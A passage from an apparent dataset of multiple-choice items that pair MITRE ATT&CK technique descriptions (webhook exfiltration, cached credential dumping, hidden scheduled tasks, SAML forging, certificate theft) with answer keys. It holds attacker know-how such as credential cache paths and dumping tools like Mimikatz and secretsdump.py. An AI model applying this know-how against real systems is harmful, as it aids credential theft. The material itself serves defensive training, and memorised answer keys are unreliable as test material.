      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server. Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello. When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. \n\nAdversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated Automated Exfiltration of emails, chat messages, and other data. Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.\n\nAccess to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.",
      "options": "A. Exfiltration Over Web Service: Exfiltration Over Webhook, B. Gather Victim Host Information: Client Configurations, C. Obtain Capabilities: Digital Certificates, D. Scheduled Task/Job: Cron",
      "choice": "A. Exfiltration Over Web Service: Exfiltration Over Webhook",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash. The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password.\n\nOn Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at `/var/lib/sss/db/cache.domain.ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb` for Quest. Adversaries can use utilities, such as `tdbdump`, on these database files to dump the cached hashes and use Password Cracking to obtain the plaintext password. \n\nWith SYSTEM or sudo access, the tools/utilities such as Mimikatz, Reg, and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.\n\nA. Gather Victim Org Information: Business Relationships, B. Gather Victim Identity Information: Credentials, C. Event Triggered Execution: Image File Execution Options Injection, D. OS Credential Dumping: Cached Domain Credentials\nAnswer:",
    "context": "",
    "output": "D. OS Credential Dumping: Cached Domain Credentials",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash. The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password.\n\nOn Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at `/var/lib/sss/db/cache.domain.ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb` for Quest. Adversaries can use utilities, such as `tdbdump`, on these database files to dump the cached hashes and use Password Cracking to obtain the plaintext password. \n\nWith SYSTEM or sudo access, the tools/utilities such as Mimikatz, Reg, and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.",
      "options": "A. Gather Victim Org Information: Business Relationships, B. Gather Victim Identity Information: Credentials, C. Event Triggered Execution: Image File Execution Options Injection, D. OS Credential Dumping: Cached Domain Credentials",
      "choice": "D. OS Credential Dumping: Cached Domain Credentials",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.\n\nPossible answers:\nA. Scheduled Task/Job: Container Orchestration Job, B. Scheduled Task/Job: Scheduled Task, C. Compromise Infrastructure: Virtual Private Server, D. Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
    "context": "",
    "output": "B. Scheduled Task/Job: Scheduled Task",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.",
      "options": "A. Scheduled Task/Job: Container Orchestration Job, B. Scheduled Task/Job: Scheduled Task, C. Compromise Infrastructure: Virtual Private Server, D. Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
      "choice": "B. Scheduled Task/Job: Scheduled Task",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. \n\nScripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or SSH.\n\nAdversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.\n\nPossible answers:\nA. Peripheral Device Discovery, B. Impair Defenses: Disable or Modify Cloud Firewall, C. Command and Scripting Interpreter: Network Device CLI, D. Modify Authentication Process: Network Device Authentication",
    "context": "",
    "output": "C. Command and Scripting Interpreter: Network Device CLI",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. \n\nScripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or SSH.\n\nAdversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.",
      "options": "A. Peripheral Device Discovery, B. Impair Defenses: Disable or Modify Cloud Firewall, C. Command and Scripting Interpreter: Network Device CLI, D. Modify Authentication Process: Network Device Authentication",
      "choice": "C. Command and Scripting Interpreter: Network Device CLI",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon. These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.\n\nPossible answers:\nA. Remote Access Software, B. Input Capture: Web Portal Capture, C. Network Denial of Service: Direct Network Flood, D. Boot or Logon Autostart Execution",
    "context": "",
    "output": "D. Boot or Logon Autostart Execution",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon. These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
      "options": "A. Remote Access Software, B. Input Capture: Web Portal Capture, C. Network Denial of Service: Direct Network Flood, D. Boot or Logon Autostart Execution",
      "choice": "D. Boot or Logon Autostart Execution",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW. Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.\n\nAdversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.\n\nA. Hide Artifacts: VBA Stomping, B. Gather Victim Network Information: Network Trust Dependencies, C. Subvert Trust Controls: Mark-of-the-Web Bypass, D. Modify Registry\nAnswer:",
    "context": "",
    "output": "C. Subvert Trust Controls: Mark-of-the-Web Bypass",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW. Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.\n\nAdversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.",
      "options": "A. Hide Artifacts: VBA Stomping, B. Gather Victim Network Information: Network Trust Dependencies, C. Subvert Trust Controls: Mark-of-the-Web Bypass, D. Modify Registry",
      "choice": "C. Subvert Trust Controls: Mark-of-the-Web Bypass",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Answer which mitre technique is related to the description: Adversaries may the technique, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\nA. Network Share Discovery, B. Use Alternate Authentication Material, C. Modify Cloud Compute Infrastructure: Delete Cloud Instance, D. Abuse Elevation Control Mechanism: TCC Manipulation\nAnswer:",
    "context": "",
    "output": "B. Use Alternate Authentication Material",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may the technique, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",
      "options": "A. Network Share Discovery, B. Use Alternate Authentication Material, C. Modify Cloud Compute Infrastructure: Delete Cloud Instance, D. Abuse Elevation Control Mechanism: TCC Manipulation",
      "choice": "B. Use Alternate Authentication Material",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.\n\nCreating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via Token Impersonation/Theft or created via Make and Impersonate Token before being used to create a process.\n\nWhile this technique is distinct from Token Impersonation/Theft, the techniques can be used in conjunction where a token is duplicated and then used to create a new process.\nA. Access Token Manipulation: Create Process with Token, B. Office Application Startup: Add-ins, C. Account Access Removal, D. Search Open Technical Databases\nAnswer:",
    "context": "",
    "output": "A. Access Token Manipulation: Create Process with Token",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.\n\nCreating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via Token Impersonation/Theft or created via Make and Impersonate Token before being used to create a process.\n\nWhile this technique is distinct from Token Impersonation/Theft, the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",
      "options": "A. Access Token Manipulation: Create Process with Token, B. Office Application Startup: Add-ins, C. Account Access Removal, D. Search Open Technical Databases",
      "choice": "A. Access Token Manipulation: Create Process with Token",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.\n\nPowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.  \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched.  \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.\nA. Develop Capabilities: Malware, B. Event Triggered Execution: PowerShell Profile, C. Process Injection: ListPlanting, D. Hide Artifacts: Process Argument Spoofing",
    "context": "",
    "output": "B. Event Triggered Execution: PowerShell Profile",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.\n\nPowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.  \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched.  \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.",
      "options": "A. Develop Capabilities: Malware, B. Event Triggered Execution: PowerShell Profile, C. Process Injection: ListPlanting, D. Hide Artifacts: Process Argument Spoofing",
      "choice": "B. Event Triggered Execution: PowerShell Profile",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.\n\nAn adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment. An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components.\nA. Email Collection, B. Remote Services: SMB/Windows Admin Shares, C. Pre-OS Boot: Component Firmware, D. Unsecured Credentials: Container API\nAnswer:",
    "context": "",
    "output": "D. Unsecured Credentials: Container API",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.\n\nAn adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment. An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components.",
      "options": "A. Email Collection, B. Remote Services: SMB/Windows Admin Shares, C. Pre-OS Boot: Component Firmware, D. Unsecured Credentials: Container API",
      "choice": "D. Unsecured Credentials: Container API",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS). \n\nOAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.\n\nFor example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded. With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account. The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured \u2013 for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.\n\nDirect API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user\u2019s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated. Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n\nA. Data from Configuration Repository: SNMP (MIB Dump), B. Proxy: Domain Fronting, C. Compromise Infrastructure: Server, D. Use Alternate Authentication Material: Application Access Token\nA:",
    "context": "",
    "output": "D. Use Alternate Authentication Material: Application Access Token",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS). \n\nOAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.\n\nFor example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded. With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account. The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured \u2013 for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.\n\nDirect API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user\u2019s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated. Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",
      "options": "A. Data from Configuration Repository: SNMP (MIB Dump), B. Proxy: Domain Fronting, C. Compromise Infrastructure: Server, D. Use Alternate Authentication Material: Application Access Token",
      "choice": "D. Use Alternate Authentication Material: Application Access Token",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAn adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate. The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>. Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.\n\nAn adversary may utilize Private Keys to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate. This differs from Steal Application Access Token and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nAn adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to Use Alternate Authentication Material, which may bypass multi-factor and other authentication protection mechanisms.\nA. Forge Web Credentials: SAML Tokens, B. Use Alternate Authentication Material, C. Obtain Capabilities: Exploits, D. Gather Victim Network Information: Network Topology\nAnswer:",
    "context": "",
    "output": "A. Forge Web Credentials: SAML Tokens",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAn adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate. The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>. Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.\n\nAn adversary may utilize Private Keys to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate. This differs from Steal Application Access Token and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nAn adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to Use Alternate Authentication Material, which may bypass multi-factor and other authentication protection mechanisms.",
      "options": "A. Forge Web Credentials: SAML Tokens, B. Use Alternate Authentication Material, C. Obtain Capabilities: Exploits, D. Gather Victim Network Information: Network Topology",
      "choice": "A. Forge Web Credentials: SAML Tokens",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.\n\nAuthentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files), misplaced certificate files (i.e. Unsecured Credentials), or directly from the Windows certificate store via various crypto APIs. With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate\u2019s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate\u2019s subject alternative name (SAN) values define the certificate owner\u2019s alternate names.\n\nAbusing certificates for authentication credentials may enable other behaviors such as Lateral Movement. Certificate-related misconfigurations may also enable opportunities for Privilege Escalation, by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable Persistence via stealing or forging certificates that can be used as Valid Accounts for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.\n\nAdversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish Persistence by forging arbitrary authentication certificates for the victim domain (known as \u201cgolden\u201d certificates). Adversaries may also target certificates and related services in order to access other forms of credentials, such as Golden Ticket ticket-granting tickets (TGT) or NTLM plaintext.\n\nOptions:\nA. Modify Authentication Process: Pluggable Authentication Modules, B. Account Manipulation: SSH Authorized Keys, C. Account Manipulation: Additional Email Delegate Permissions, D. Steal or Forge Authentication Certificates",
    "context": "",
    "output": "D. Steal or Forge Authentication Certificates",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.\n\nAuthentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files), misplaced certificate files (i.e. Unsecured Credentials), or directly from the Windows certificate store via various crypto APIs. With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate\u2019s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate\u2019s subject alternative name (SAN) values define the certificate owner\u2019s alternate names.\n\nAbusing certificates for authentication credentials may enable other behaviors such as Lateral Movement. Certificate-related misconfigurations may also enable opportunities for Privilege Escalation, by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable Persistence via stealing or forging certificates that can be used as Valid Accounts for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.\n\nAdversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish Persistence by forging arbitrary authentication certificates for the victim domain (known as \u201cgolden\u201d 